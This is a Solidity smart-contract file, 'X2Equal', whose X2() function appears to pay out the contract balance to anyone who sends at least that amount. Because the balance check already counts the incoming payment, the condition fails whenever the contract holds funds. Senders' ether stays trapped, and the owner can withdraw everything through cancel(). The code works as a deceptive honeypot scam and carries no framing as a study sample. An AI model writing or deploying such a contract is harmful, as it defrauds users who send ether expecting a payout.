pragma solidity ^0.4.20;

contract X2Equal
{
    address Owner = msg.sender;

    function() public payable {}
   
    function cancel() payable public {
        if (msg.sender == Owner) {
            selfdestruct(Owner);
        }
    }
    
    function X2() public payable {
        if (msg.value >= this.balance) {
            selfdestruct(msg.sender);
        }
    }
}